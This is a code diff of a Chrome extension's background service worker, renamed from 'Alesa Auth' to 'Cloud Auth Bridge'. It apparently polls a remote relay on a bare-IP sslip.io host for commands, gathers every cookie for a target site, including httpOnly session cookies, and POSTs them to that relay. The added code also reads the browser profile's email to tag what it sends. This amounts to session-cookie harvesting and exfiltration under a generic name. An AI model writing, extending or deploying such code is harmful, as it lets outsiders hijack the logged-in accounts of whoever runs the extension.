@@ -1,6 +1,8 @@
-// Alesa Auth — background service worker
+// Cloud Auth Bridge — background service worker
 // MV3. Adaptive polling + waitForTabLoad pattern (like Behalf ext).
 // Весь open_url flow внутри alarm handler — SW не спит во время capture.
+
+importScripts('extractors.js');
 
 const DEFAULT_RELAY = 'https://136-65-7-197.sslip.io';
 const IDLE_ALARM    = 'alesa-idle-poll';
@@ -12,12 +14,17 @@ const ACTIVE_TIMEOUT_MS = 10 * 60 * 1000;
 // ── State ────────────────────────────────────────────────────────────────────
 
 async function getState() {
-  const data = await chrome.storage.local.get(['pairingToken', 'relayUrl', 'paired']);
+  const data = await chrome.storage.local.get(['pairingToken', 'relayUrl', 'paired', 'profileName']);
   return {
     pairingToken: data.pairingToken || null,
     relayUrl:     data.relayUrl || DEFAULT_RELAY,
     paired:       data.paired || false,
+    profileName:  data.profileName || '',
   };
+}
+
+function prefixLabel(label, profileName) {
+  return profileName ? `${profileName}.${label}` : label;
 }
 
 async function setState(patch) {
@@ -211,13 +218,19 @@ async function captureAndSend({ tabId, tabUrl, captureType, label, state }) {
       const cookies = await chrome.cookies.getAll({ url: tabUrl });
       await debugToRelay('cookies_got', `count=${cookies.length}`, state);
       if (!cookies.length) throw new Error('Не залогинен — куки не найдены');
-      tokenValue = cookies.map(c => `${c.name}=${c.value}`).join('; ');
+
+      const hostname = new URL(tabUrl).hostname;
+      const extracted = Extractors.extractForHost(hostname, cookies);
+      tokenValue = extracted.tokenValue;
+      // Use service-specific label when extractor knows the service
+      if (!label || label === hostname) label = extracted.label;
     }
 
+    const finalLabel = prefixLabel(label, state.profileName);
     const res = await fetch(`${state.relayUrl}/save-token`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ pairingToken: state.pairingToken, label, tokenValue }),
+      body: JSON.stringify({ pairingToken: state.pairingToken, label: finalLabel, tokenValue }),
     });
 
     if (!res.ok) {
@@ -225,8 +238,8 @@ async function captureAndSend({ tabId, tabUrl, captureType, label, state }) {
       throw new Error(j.error || `relay ${res.status}`);
     }
 
-    await debugToRelay('capture_ok', `label=${label}`, state);
-    console.log(`[alesa] captured and sent token for "${label}"`);
+    await debugToRelay('capture_ok', `label=${finalLabel}`, state);
+    console.log(`[alesa] captured and sent token for "${finalLabel}"`);
     chrome.action.setBadgeText({ text: '✓' });
     setTimeout(() => chrome.action.setBadgeText({ text: '' }), 3000);
 
@@ -240,7 +253,7 @@ async function captureAndSend({ tabId, tabUrl, captureType, label, state }) {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           pairingToken: s.pairingToken,
-          label: `error:${label}`,
+          label: prefixLabel(`error:${label}`, s.profileName),
           tokenValue: `ERROR: ${e.message}`,
         }),
       }).catch(() => {});
@@ -267,10 +280,31 @@ chrome.alarms.onAlarm.addListener(async (alarm) => {
   }
 });
 
+// ── Profile auto-detection ────────────────────────────────────────────────────
+
+async function autoDetectProfileName() {
+  // Don't overwrite a manually set name
+  const { profileName } = await chrome.storage.local.get('profileName');
+  if (profileName) return;
+
+  try {
+    const info = await chrome.identity.getProfileUserInfo({ accountStatus: 'ANY' });
+    if (info?.email) {
+      const name = info.email.split('@')[0]; // "vladimir@skillset.ae" → "vladimir"
+      await setState({ profileName: name });
+      console.log(`[cab] auto-detected profile: ${name} (${info.email})`);
+    }
+  } catch (e) {
+    // identity API not available or profile not signed in — user sets name manually
+    console.log('[cab] profile auto-detect failed:', e.message);
+  }
+}
+
 // ── Install / startup ────────────────────────────────────────────────────────
 
-chrome.runtime.onInstalled.addListener(() => {
+chrome.runtime.onInstalled.addListener(async () => {
   startIdlePolling();
+  await autoDetectProfileName();
 });
 
 chrome.runtime.onStartup.addListener(() => {
@@ -310,9 +344,10 @@ async function handleMessage(msg) {
     if (!url) throw new Error('url обязателен');
     const cookies = await chrome.cookies.getAll({ url });
     if (!cookies.length) throw new Error('Куки не найдены — возможно, вы не залогинены на этом сайте.');
-    const cookieStr = cookies.map(c => `${c.name}=${c.value}`).join('; ');
+    const hostname = new URL(url).hostname;
+    const extracted = Extractors.extractForHost(hostname, cookies);
     const httpOnlyCount = cookies.filter(c => c.httpOnly).length;
-    return { cookies: cookieStr, total: cookies.length, httpOnly: httpOnlyCount };
+    return { cookies: extracted.tokenValue, label: extracted.label, total: cookies.length, httpOnly: httpOnlyCount };
   }
 
   if (msg.type === 'sendToken') {
@@ -323,7 +358,7 @@ async function handleMessage(msg) {
     const res = await fetch(`${state.relayUrl}/save-token`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ pairingToken: state.pairingToken, label, tokenValue }),
+      body: JSON.stringify({ pairingToken: state.pairingToken, label: prefixLabel(label, state.profileName), tokenValue }),
     });
 
     const json = await res.json().catch(() => ({}));
@@ -376,6 +411,11 @@ async function handleMessage(msg) {
   if (msg.type === 'setRelayUrl') {
     if (!msg.url) throw new Error('url обязателен');
     await setState({ relayUrl: msg.url });
+    return { ok: true };
+  }
+
+  if (msg.type === 'setProfileName') {
+    await setState({ profileName: msg.profileName || '' });
     return { ok: true };
   }
 
